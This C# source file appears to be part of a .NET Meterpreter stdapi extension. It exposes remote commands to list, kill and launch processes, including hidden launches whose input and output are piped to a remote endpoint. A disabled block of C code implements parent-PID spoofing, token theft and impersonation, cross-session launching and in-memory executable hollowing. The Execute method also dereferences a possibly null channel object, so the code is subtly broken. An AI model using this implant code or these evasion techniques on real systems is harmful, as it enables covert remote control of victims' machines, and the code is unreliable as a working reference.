using Met.Core;
using Met.Core.Extensions;
using Met.Core.Proto;
using Met.Stdapi.Channel;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;

namespace Met.Stdapi
{
    public class SysProcess
    {
        private ChannelManager channelManager;

        [Flags]
        private enum ProcessExecutionFlags : uint
        {
            Hidden = (1 << 0),
            Channelized = (1 << 1),
            Suspended = (1 << 2),
            UseThreadToken = (1 << 3),
            Desktop = (1 << 4),
            Session = (1 << 5),
        }

        public void Register(string extName, PluginManager pluginManager, ChannelManager channelManager)
        {
            this.channelManager = channelManager;

            pluginManager.RegisterFunction(extName, "stdapi_sys_process_getpid", false, this.GetPid);
            pluginManager.RegisterFunction(extName, "stdapi_sys_process_kill", false, this.Kill);
            pluginManager.RegisterFunction(extName, "stdapi_sys_process_get_processes", false, this.GetProcesses);
            pluginManager.RegisterFunction(extName, "stdapi_sys_process_execute", false, this.Execute);
        }

        private InlineProcessingResult Execute(Packet request, Packet response)
        {
            var processChannel = default(ProcessChannel);
            var arguments = request.Tlvs.TryGetTlvValueAsString(TlvType.StdapiProcessArguments);
            var executablePath = request.Tlvs.TryGetTlvValueAsString(TlvType.StdapiProcessPath);
            var flags = (ProcessExecutionFlags)request.Tlvs.TryGetTlvValueAsDword(TlvType.StdapiProcessFlags);
            var parentPid = request.Tlvs.TryGetTlvValueAsDword(TlvType.StdapiProcessParentProcessId);

            response.Result = PacketResult.Success;

            if (!string.IsNullOrEmpty(executablePath))
            {
                var newProcess = new Process
                {
                    StartInfo = new ProcessStartInfo(executablePath, arguments)
                    {
                        CreateNoWindow = flags.HasFlag(ProcessExecutionFlags.Hidden)
                    }
                };

                if (flags.HasFlag(ProcessExecutionFlags.Channelized))
                {
                    processChannel = new ProcessChannel(channelManager, newProcess);
                    this.channelManager.Manage(processChannel);
                }

                if (newProcess.Start())
                {
                    if (processChannel != null)
                    {
                        processChannel.ProcessStarted();
                    }

                    response.Add(TlvType.StdapiProcessId, newProcess.Id);
                    response.Add(TlvType.ChannelId, processChannel.ChannelId);
                }
                else
                {
                    response.Result = PacketResult.InvalidFunction;
                }
            }
            else
            {
                response.Result = PacketResult.BadArguments;
            }
#if THISISNOTATHING
		// If the channelized flag is set, create a pipe for stdin/stdout/stderr
		// such that input can be directed to and from the remote endpoint
		if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED)
		{
			SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
			PoolChannelOps chops;
			Channel *newChannel;

			// Allocate the channel context
			if (!(ctx = (ProcessChannelContext *)malloc(sizeof(ProcessChannelContext))))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			memset(&chops, 0, sizeof(PoolChannelOps));

			// Initialize the channel operations
			dprintf("[PROCESS] context address 0x%p", ctx);
			chops.native.context = ctx;
			chops.native.write = process_channel_write;
			chops.native.close = process_channel_close;
			chops.native.interact = process_channel_interact;
			chops.read = process_channel_read;

			// Allocate the pool channel
			if (!(newChannel = met_api->channel.create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chops)))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			// Set the channel's type to process
			met_api->channel.set_type(newChannel, "process");

			// Allocate the stdin and stdout pipes
			if ((!CreatePipe(&in[0], &in[1], &sa, 0)) || (!CreatePipe(&out[0], &out[1], &sa, 0)))
			{
				met_api->channel.destroy(newChannel, NULL);

				newChannel = NULL;

				free(ctx);

				result = GetLastError();
				break;
			}

			// Initialize the startup info to use the pipe handles
			si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
			si.StartupInfo.hStdInput = in[0];
			si.StartupInfo.hStdOutput = out[1];
			si.StartupInfo.hStdError = out[1];
			inherit = TRUE;
			createFlags |= CREATE_NEW_CONSOLE;

			// Set the context to have the write side of stdin and the read side
			// of stdout
			ctx->pStdin = in[1];
			ctx->pStdout = out[0];

			// Add the channel identifier to the response packet
			met_api->packet.add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, met_api->channel.get_id(newChannel));
		}

		// Should we create the process suspended?
		if (flags & PROCESS_EXECUTE_FLAG_SUSPENDED)
			createFlags |= CREATE_SUSPENDED;

		// Set Parent PID if provided
		if (ppid) {
			dprintf("[execute] PPID spoofing\n");
			HMODULE hKernel32Lib = LoadLibrary("kernel32.dll");
			INITIALIZEPROCTHREADATTRIBUTELIST InitializeProcThreadAttributeList = (INITIALIZEPROCTHREADATTRIBUTELIST)GetProcAddress(hKernel32Lib, "InitializeProcThreadAttributeList");
			UPDATEPROCTHREADATTRIBUTE UpdateProcThreadAttribute = (UPDATEPROCTHREADATTRIBUTE)GetProcAddress(hKernel32Lib, "UpdateProcThreadAttribute");
			BOOLEAN inherit = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_INHERIT);
			DWORD permission = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_PERMS);
			HANDLE handle = OpenProcess(permission, inherit, ppid);
			dprintf("[execute] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", ppid, permission, handle, GetLastError());
			if (
				handle &&
				hKernel32Lib &&
				InitializeProcThreadAttributeList &&
				UpdateProcThreadAttribute
			) {
				size_t len = 0;
				InitializeProcThreadAttributeList(NULL, 1, 0, &len);
				si.lpAttributeList = malloc(len);
				if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &len)) {
					printf("[execute] InitializeProcThreadAttributeList: [%d]\n", GetLastError());
					result = GetLastError();
					break;
				}

				dprintf("[execute] InitializeProcThreadAttributeList\n");

				if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), 0, 0)) {
					printf("[execute] UpdateProcThreadAttribute: [%d]\n", GetLastError());
					result = GetLastError();
					break;
				}

				dprintf("[execute] UpdateProcThreadAttribute\n");

				createFlags |= EXTENDED_STARTUPINFO_PRESENT;
				si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

				FreeLibrary(hKernel32Lib);
			}
			else {
				result = GetLastError();
				break;
			}
		}

		if (flags & PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN)
		{
			// If there is an impersonated token stored, use that one first, otherwise
			// try to grab the current thread token, then the process token
			if (remote->thread_token)
			{
				token = remote->thread_token;
				dprintf("[execute] using thread impersonation token");
			}
			else if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &token))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token);
			}

			dprintf("[execute] token is 0x%.8x", token);

			// Duplicate to make primary token (try delegation first)
			if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken))
			{
				if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken))
				{
					result = GetLastError();
					dprintf("[execute] failed to duplicate token 0x%.8x", result);
					break;
				}
			}

			hUserEnvLib = LoadLibrary("userenv.dll");
			if (NULL != hUserEnvLib)
			{
				lpfnCreateEnvironmentBlock = (LPFNCREATEENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, "CreateEnvironmentBlock");
				lpfnDestroyEnvironmentBlock = (LPFNDESTROYENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, "DestroyEnvironmentBlock");
				if (lpfnCreateEnvironmentBlock && lpfnCreateEnvironmentBlock(&pEnvironment, pToken, FALSE))
				{
					createFlags |= CREATE_UNICODE_ENVIRONMENT;
					dprintf("[execute] created a duplicated environment block");
				}
				else
				{
					pEnvironment = NULL;
				}
			}

			// Try to execute the process with duplicated token
			if (!CreateProcessAsUser(pToken, NULL, commandLine, NULL, NULL, inherit, createFlags, pEnvironment, NULL, (STARTUPINFOA*)&si, &pi))
			{
				LPCREATEPROCESSWITHTOKENW pCreateProcessWithTokenW = NULL;
				HANDLE hAdvapi32 = NULL;
				wchar_t * wcmdline = NULL;
				wchar_t * wdesktop = NULL;
				size_t size = 0;

				result = GetLastError();

				// sf: If we hit an ERROR_PRIVILEGE_NOT_HELD failure we can fall back to CreateProcessWithTokenW but this is only
				// available on 2003/Vista/2008/7. CreateProcessAsUser() seems to be just borked on some systems IMHO.
				if (result == ERROR_PRIVILEGE_NOT_HELD)
				{
					do
					{
						hAdvapi32 = LoadLibrary("advapi32.dll");
						if (!hAdvapi32)
						{
							break;
						}

						pCreateProcessWithTokenW = (LPCREATEPROCESSWITHTOKENW)GetProcAddress(hAdvapi32, "CreateProcessWithTokenW");
						if (!pCreateProcessWithTokenW)
						{
							break;
						}

						// convert the multibyte inputs to wide strings (No CreateProcessWithTokenA available unfortunatly)...
						size = mbstowcs(NULL, commandLine, 0);
						if (size == (size_t)-1)
						{
							break;
						}

						wcmdline = (wchar_t *)malloc((size + 1) * sizeof(wchar_t));
						mbstowcs(wcmdline, commandLine, size);

						if (si.StartupInfo.lpDesktop)
						{
							size = mbstowcs(NULL, (char *)si.StartupInfo.lpDesktop, 0);
							if (size != (size_t)-1)
							{
								wdesktop = (wchar_t *)malloc((size + 1) * sizeof(wchar_t));
								mbstowcs(wdesktop, (char *)si.StartupInfo.lpDesktop, size);
								si.StartupInfo.lpDesktop = (LPSTR)wdesktop;
							}
						}

						if (!pCreateProcessWithTokenW(pToken, LOGON_NETCREDENTIALS_ONLY, NULL, wcmdline, createFlags, pEnvironment, NULL, (LPSTARTUPINFOW)&si, &pi))
						{
							result = GetLastError();
							dprintf("[execute] failed to create the new process via CreateProcessWithTokenW 0x%.8x", result);
							break;
						}

						result = ERROR_SUCCESS;

					} while (0);

					if (hAdvapi32)
					{
						FreeLibrary(hAdvapi32);
					}

					SAFE_FREE(wdesktop);
					SAFE_FREE(wcmdline);
				}
				else
				{
					dprintf("[execute] failed to create the new process via CreateProcessAsUser 0x%.8x", result);
					break;
				}
			}

			if (lpfnDestroyEnvironmentBlock && pEnvironment)
			{
				lpfnDestroyEnvironmentBlock(pEnvironment);
			}

			if (NULL != hUserEnvLib)
			{
				FreeLibrary(hUserEnvLib);
			}
		}
		else if (flags & PROCESS_EXECUTE_FLAG_SESSION)
		{
			typedef BOOL(WINAPI * WTSQUERYUSERTOKEN)(ULONG SessionId, PHANDLE phToken);
			WTSQUERYUSERTOKEN pWTSQueryUserToken = NULL;
			HANDLE hToken = NULL;
			HMODULE hWtsapi32 = NULL;
			BOOL bSuccess = FALSE;
			DWORD dwResult = ERROR_SUCCESS;

			do
			{
				// Note: wtsapi32!WTSQueryUserToken is not available on NT4 or 2000 so we dynamically resolve it.
				hWtsapi32 = LoadLibraryA("wtsapi32.dll");

				session = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_SESSION);

				if (session_id(GetCurrentProcessId()) == session || !hWtsapi32)
				{
					if (!CreateProcess(NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, (STARTUPINFOA*)&si, &pi))
					{
						BREAK_ON_ERROR("[PROCESS] execute in self session: CreateProcess failed");
					}
				}
				else
				{
					pWTSQueryUserToken = (WTSQUERYUSERTOKEN)GetProcAddress(hWtsapi32, "WTSQueryUserToken");
					if (!pWTSQueryUserToken)
					{
						BREAK_ON_ERROR("[PROCESS] execute in session: GetProcAdress WTSQueryUserToken failed");
					}

					if (!pWTSQueryUserToken(session, &hToken))
					{
						BREAK_ON_ERROR("[PROCESS] execute in session: WTSQueryUserToken failed");
					}

					if (!CreateProcessAsUser(hToken, NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, (STARTUPINFOA*)&si, &pi))
					{
						BREAK_ON_ERROR("[PROCESS] execute in session: CreateProcessAsUser failed");
					}
				}

			} while (0);

			if (hWtsapi32)
			{
				FreeLibrary(hWtsapi32);
			}

			if (hToken)
			{
				CloseHandle(hToken);
			}

			result = dwResult;

			if (result != ERROR_SUCCESS)
			{
				break;
			}
		}
		else
		{
			// Try to execute the process
			if (!CreateProcess(NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, (STARTUPINFOA*)&si, &pi))
			{
				result = GetLastError();
				break;
			}
		}

		//
		// Do up the in memory exe execution if the user requested it
		//
		if (doInMemory)
		{

			//
			// Unmap the dummy executable and map in the new executable into the
			// target process
			//
			if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, inMemoryData.buffer))
			{
				result = GetLastError();
				break;
			}

			//
			// Resume the thread and let it rock...
			//
			if (ResumeThread(pi.hThread) == (DWORD)-1)
			{
				result = GetLastError();
				break;
			}

		}

		// check for failure here otherwise we can get a case where we
		// failed but return a process id and this will throw off the ruby side.
		if (result == ERROR_SUCCESS)
		{
			// if we managed to successfully create a channelized process, we need to retain
			// a handle to it so that we can shut it down externally if required.
			if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED
				&& ctx != NULL)
			{
				dprintf("[PROCESS] started process 0x%x", pi.hProcess);
				ctx->pProcess = pi.hProcess;
			}

			// Add the process identifier to the response packet
			met_api->packet.add_tlv_uint(response, TLV_TYPE_PID, pi.dwProcessId);

			met_api->packet.add_tlv_qword(response, TLV_TYPE_PROCESS_HANDLE, (QWORD)pi.hProcess);

			CloseHandle(pi.hThread);
		}


#endif

            return InlineProcessingResult.Continue;
        }

        private InlineProcessingResult Kill(Packet request, Packet response)
        {
            var pidList = default(List<Tlv>);

            if (request.Tlvs.TryGetValue(TlvType.StdapiProcessId, out pidList))
            {
                foreach (var pid in pidList.Select(tlv => tlv.ValueAsDword()))
                {
                    var process = Process.GetProcessById((int)pid);
                    if (process != null)
                    {
                        process.Kill();
                    }
                }
            }

            response.Result = PacketResult.Success;
            return InlineProcessingResult.Continue;
        }

        private InlineProcessingResult GetPid(Packet request, Packet response)
        {
            response.Add(TlvType.StdapiProcessId, (uint)Process.GetCurrentProcess().Id);
            response.Result = PacketResult.Success;
            return InlineProcessingResult.Continue;
        }

        private InlineProcessingResult GetProcesses(Packet request, Packet response)
        {
            foreach (var process in Process.GetProcesses())
            {
                var processTlv = response.AddGroup(TlvType.StdapiProcessGroup);

                processTlv.Add(TlvType.StdapiProcessId, (uint)process.Id);
                processTlv.Add(TlvType.StdapiProcessName, process.ProcessName);

                var fileName = Helpers.Try(process, p => p.MainModule.FileName);
                if (fileName != null)
                {
                    processTlv.Add(TlvType.StdapiProcessPath, fileName);
                }

                var userName = process.GetUserName();
                if (userName != null)
                {
                    processTlv.Add(TlvType.StdapiUserName, userName);
                }
                processTlv.Add(TlvType.StdapiProcessSession, (uint)process.SessionId);

                var parent = process.GetParentProcess();
                if (parent != null)
                {
                    processTlv.Add(TlvType.StdapiProcessParentProcessId, (uint)parent.Id);
                }

                Helpers.Try(process, p => p.IsWow64(), r => processTlv.Add(TlvType.StdapiProcessArch, (uint)(r ? SystemArchictecture.X86 : SystemArchictecture.X64)));
            }

            response.Result = PacketResult.Success;
            return InlineProcessingResult.Continue;
        }

    }
}
